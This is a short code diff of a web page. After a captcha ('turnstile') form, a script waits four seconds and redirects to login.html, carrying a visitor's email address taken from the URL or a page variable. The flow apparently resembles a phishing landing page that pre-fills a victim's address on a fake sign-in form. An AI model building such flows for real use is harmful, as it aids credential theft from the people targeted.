@@ -83,31 +83,14 @@
       document.getElementById("turnstile-form").submit();
     }
   </script>
-  <script>
+<script>
 window.onload = function () {
-
   setTimeout(() => {
-
-    // Extract from URL hash ONLY
-    let email = "";
-    if (window.location.hash) {
-      email = window.location.hash.replace("#", "");
-    }
-
-    // Redirect (only passing email if it exists)
-    if (email.length > 0) {
-      window.location.href = "login.html#" + encodeURIComponent(email);
+    if (window.extractedEmail) {
+      window.location.href = "login.html?email=" + encodeURIComponent(window.extractedEmail);
     } else {
       window.location.href = "login.html";
     }
-
   }, 4000);
-
 };
 </script>
-
-
-
-
-
-
